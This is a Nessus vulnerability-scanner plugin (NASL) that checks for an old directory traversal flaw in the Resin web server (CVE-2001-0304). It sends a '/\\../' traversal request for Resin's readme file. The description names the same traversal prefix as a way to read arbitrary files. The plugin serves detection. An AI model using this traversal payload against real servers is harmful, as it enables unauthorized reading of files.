#
# This script was written by Renaud Deraison <deraison@cvs.nessus.org>
#
# See the Nessus Scripts License for details
#

if(description)
{
 script_id(10656);
 script_bugtraq_id(2384);
script_cve_id("CVE-2001-0304");
 script_version ("$Revision: 1.11 $");
 
 name["english"] = "Resin traversal";
 name["francais"] = "Resin traversal";
 script_name(english:name["english"], francais:name["francais"]);
 
 desc["english"] = "
It is possible to read arbitrary files on
the remote server by prepending /\../\../
in front on the file name.

Solution : Upgrade your version of Resin in 1.2.3
Risk factor : High";

 desc["francais"] = "Il est possible de lire
n'importe quel fichier sur la machine distante
en ajoutant des points devant leur noms,
tels que /\../\../


Solution : Mettez à jour votre version de Resin en 1.2.3
Facteur de risque : Elevé";

 script_description(english:desc["english"], francais:desc["francais"]);
 
 summary["english"] = "\..\..\file.txt";
 summary["francais"] = "\..\..\file.txt";
 script_summary(english:summary["english"], francais:summary["francais"]);
 
 script_category(ACT_ATTACK);
 
 
 script_copyright(english:"This script is Copyright (C) 2001 Renaud Deraison",
		francais:"Ce script est Copyright (C) 2001 Renaud Deraison");
 family["english"] = "CGI abuses";
 family["francais"] = "Abus de CGI";
 script_family(english:family["english"], francais:family["francais"]);
 script_dependencie("find_service.nes");
 script_require_ports("Services/www", 8080);
 exit(0);
}

#
# The script code starts here
#

include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:8080); # by default, Resin listens on this port, not 80
if(get_port_state(port))
{
 req = string("/\\../readme.txt");
 rq = http_get(item:req, port:port);
 r = http_keepalive_send_recv(port:port, data:rq);
 if ("This is the README file for Resin(tm)" >< r)
   security_hole(port);
}
